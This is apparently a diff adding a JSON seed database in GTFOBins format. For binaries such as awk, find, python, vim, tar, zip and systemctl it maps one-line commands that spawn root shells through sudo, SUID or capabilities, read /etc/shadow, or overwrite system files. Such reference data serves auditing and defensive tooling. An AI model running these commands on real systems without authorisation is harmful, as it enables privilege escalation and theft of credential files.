@@ -1,0 +1,353 @@
+{
+  "generated_at": "2026-05-02T00:00:00Z",
+  "source": "curated seed database compatible with GTFOBins schema",
+  "binaries": {
+    "awk": {
+      "functions": {
+        "shell": [
+          {
+            "description": "Awk can execute a command through the system function.",
+            "code": "awk 'BEGIN { system(\"/bin/sh\") }'"
+          }
+        ],
+        "sudo": [
+          {
+            "description": "If awk is allowed through sudo, it can spawn a privileged shell.",
+            "code": "sudo awk 'BEGIN { system(\"/bin/sh\") }'"
+          }
+        ]
+      }
+    },
+    "bash": {
+      "functions": {
+        "sudo": [
+          {
+            "description": "If bash is allowed through sudo, it directly opens a privileged shell.",
+            "code": "sudo bash"
+          }
+        ],
+        "suid": [
+          {
+            "description": "If bash has the SUID bit set, -p keeps elevated privileges.",
+            "code": "./bash -p"
+          }
+        ]
+      }
+    },
+    "cp": {
+      "functions": {
+        "sudo": [
+          {
+            "description": "If cp is allowed through sudo, it can overwrite privileged files.",
+            "code": "sudo cp /tmp/file /etc/target"
+          }
+        ],
+        "file-write": [
+          {
+            "description": "Cp can write files when executed with elevated privileges.",
+            "code": "cp /tmp/file /etc/target"
+          }
+        ]
+      }
+    },
+    "env": {
+      "functions": {
+        "sudo": [
+          {
+            "description": "If env is allowed through sudo, it can execute a shell.",
+            "code": "sudo env /bin/sh"
+          }
+        ],
+        "suid": [
+          {
+            "description": "If env has the SUID bit set, it can execute a shell with elevated privileges.",
+            "code": "./env /bin/sh -p"
+          }
+        ]
+      }
+    },
+    "find": {
+      "functions": {
+        "shell": [
+          {
+            "description": "Find can execute an arbitrary command through -exec.",
+            "code": "find . -exec /bin/sh \\; -quit"
+          }
+        ],
+        "sudo": [
+          {
+            "description": "If find is allowed through sudo, it can spawn a privileged shell.",
+            "code": "sudo find . -exec /bin/sh \\; -quit"
+          }
+        ],
+        "suid": [
+          {
+            "description": "If find has the SUID bit set, -exec can spawn a shell preserving privileges.",
+            "code": "./find . -exec /bin/sh -p \\; -quit"
+          }
+        ]
+      }
+    },
+    "less": {
+      "functions": {
+        "sudo": [
+          {
+            "description": "Less supports shell escapes when executed interactively.",
+            "code": "sudo less /etc/profile"
+          }
+        ],
+        "file-read": [
+          {
+            "description": "Less can read files with the privileges of the process.",
+            "code": "less /etc/shadow"
+          }
+        ]
+      }
+    },
+    "more": {
+      "functions": {
+        "sudo": [
+          {
+            "description": "More supports shell escapes when executed interactively.",
+            "code": "sudo more /etc/profile"
+          }
+        ],
+        "file-read": [
+          {
+            "description": "More can read files with the privileges of the process.",
+            "code": "more /etc/shadow"
+          }
+        ]
+      }
+    },
+    "nano": {
+      "functions": {
+        "sudo": [
+          {
+            "description": "Nano can execute a shell command through its execute prompt.",
+            "code": "sudo nano"
+          }
+        ],
+        "file-write": [
+          {
+            "description": "Nano can edit files with elevated privileges.",
+            "code": "nano /etc/target"
+          }
+        ]
+      }
+    },
+    "node": {
+      "functions": {
+        "shell": [
+          {
+            "description": "Node.js can execute a shell through child_process.",
+            "code": "node -e 'require(\"child_process\").spawn(\"/bin/sh\", {stdio: [0, 1, 2]})'"
+          }
+        ],
+        "sudo": [
+          {
+            "description": "If node is allowed through sudo, it can spawn a privileged shell.",
+            "code": "sudo node -e 'require(\"child_process\").spawn(\"/bin/sh\", {stdio: [0, 1, 2]})'"
+          }
+        ],
+        "capabilities": [
+          {
+            "description": "Node can change UID if cap_setuid is granted.",
+            "code": "node -e 'process.setuid(0); require(\"child_process\").spawn(\"/bin/sh\", {stdio: [0, 1, 2]})'"
+          }
+        ]
+      }
+    },
+    "perl": {
+      "functions": {
+        "shell": [
+          {
+            "description": "Perl can execute a shell through exec.",
+            "code": "perl -e 'exec \"/bin/sh\"'"
+          }
+        ],
+        "sudo": [
+          {
+            "description": "If perl is allowed through sudo, it can spawn a privileged shell.",
+            "code": "sudo perl -e 'exec \"/bin/sh\"'"
+          }
+        ],
+        "suid": [
+          {
+            "description": "If perl has the SUID bit set, it can spawn a shell with elevated privileges.",
+            "code": "./perl -e 'exec \"/bin/sh\"'"
+          }
+        ],
+        "capabilities": [
+          {
+            "description": "Perl can set UID if cap_setuid is granted.",
+            "code": "perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec \"/bin/sh\";'"
+          }
+        ]
+      }
+    },
+    "python": {
+      "functions": {
+        "shell": [
+          {
+            "description": "Python can execute a shell through os.system.",
+            "code": "python -c 'import os; os.system(\"/bin/sh\")'"
+          }
+        ],
+        "sudo": [
+          {
+            "description": "If python is allowed through sudo, it can spawn a privileged shell.",
+            "code": "sudo python -c 'import os; os.system(\"/bin/sh\")'"
+          }
+        ],
+        "suid": [
+          {
+            "description": "If python has the SUID bit set, it can spawn a shell preserving privileges.",
+            "code": "./python -c 'import os; os.execl(\"/bin/sh\", \"sh\", \"-p\")'"
+          }
+        ],
+        "capabilities": [
+          {
+            "description": "Python can switch to UID 0 if cap_setuid is granted.",
+            "code": "python -c 'import os; os.setuid(0); os.system(\"/bin/sh\")'"
+          }
+        ]
+      }
+    },
+    "ruby": {
+      "functions": {
+        "shell": [
+          {
+            "description": "Ruby can execute a shell through exec.",
+            "code": "ruby -e 'exec \"/bin/sh\"'"
+          }
+        ],
+        "sudo": [
+          {
+            "description": "If ruby is allowed through sudo, it can spawn a privileged shell.",
+            "code": "sudo ruby -e 'exec \"/bin/sh\"'"
+          }
+        ]
+      }
+    },
+    "sed": {
+      "functions": {
+        "sudo": [
+          {
+            "description": "Sed can read or write files with elevated privileges.",
+            "code": "sudo sed -n '1p' /etc/shadow"
+          }
+        ],
+        "file-read": [
+          {
+            "description": "Sed can read files with the privileges of the process.",
+            "code": "sed -n '1p' /etc/shadow"
+          }
+        ]
+      }
+    },
+    "sh": {
+      "functions": {
+        "sudo": [
+          {
+            "description": "If sh is allowed through sudo, it directly opens a privileged shell.",
+            "code": "sudo sh"
+          }
+        ],
+        "suid": [
+          {
+            "description": "If sh has the SUID bit set, -p keeps elevated privileges.",
+            "code": "./sh -p"
+          }
+        ]
+      }
+    },
+    "systemctl": {
+      "functions": {
+        "sudo": [
+          {
+            "description": "Systemctl can start units that execute attacker-controlled commands.",
+            "code": "sudo systemctl link /tmp/root.service && sudo systemctl start root.service"
+          }
+        ]
+      }
+    },
+    "tar": {
+      "functions": {
+        "sudo": [
+          {
+            "description": "Tar can execute a command through checkpoint actions.",
+            "code": "sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh"
+          }
+        ],
+        "shell": [
+          {
+            "description": "Tar can execute a command through checkpoint actions.",
+            "code": "tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh"
+          }
+        ]
+      }
+    },
+    "tcpdump": {
+      "functions": {
+        "sudo": [
+          {
+            "description": "Tcpdump can execute a postrotate command through the -z flag.",
+            "code": "sudo tcpdump -ln -i lo -w /dev/null -W 1 -G 1 -z /tmp/xx -Z root"
+          }
+        ],
+        "file-write": [
+          {
+            "description": "Tcpdump can write capture data to a file with elevated privileges.",
+            "code": "echo DATA | tcpdump -w /tmp/outfile"
+          }
+        ]
+      }
+    },
+    "vim": {
+      "functions": {
+        "shell": [
+          {
+            "description": "Vim can spawn an interactive shell through command mode.",
+            "code": "vim -c ':!/bin/sh'"
+          }
+        ],
+        "sudo": [
+          {
+            "description": "If vim is allowed through sudo, it can spawn a privileged shell.",
+            "code": "sudo vim -c ':!/bin/sh'"
+          }
+        ],
+        "suid": [
+          {
+            "description": "If vim has the SUID bit set, it can spawn a shell preserving privileges.",
+            "code": "./vim -c ':py import os; os.execl(\"/bin/sh\", \"sh\", \"-p\")'"
+          }
+        ],
+        "file-write": [
+          {
+            "description": "Vim can edit files with the privileges of the process.",
+            "code": "vim /etc/target"
+          }
+        ]
+      }
+    },
+    "zip": {
+      "functions": {
+        "sudo": [
+          {
+            "description": "Zip can execute a command through the -T and -TT options.",
+            "code": "sudo zip /tmp/test.zip /tmp/test -T --unzip-command='sh -c /bin/sh'"
+          }
+        ],
+        "shell": [
+          {
+            "description": "Zip can execute a command through the -T and -TT options.",
+            "code": "zip /tmp/test.zip /tmp/test -T --unzip-command='sh -c /bin/sh'"
+          }
+        ]
+      }
+    }
+  }
+}
+
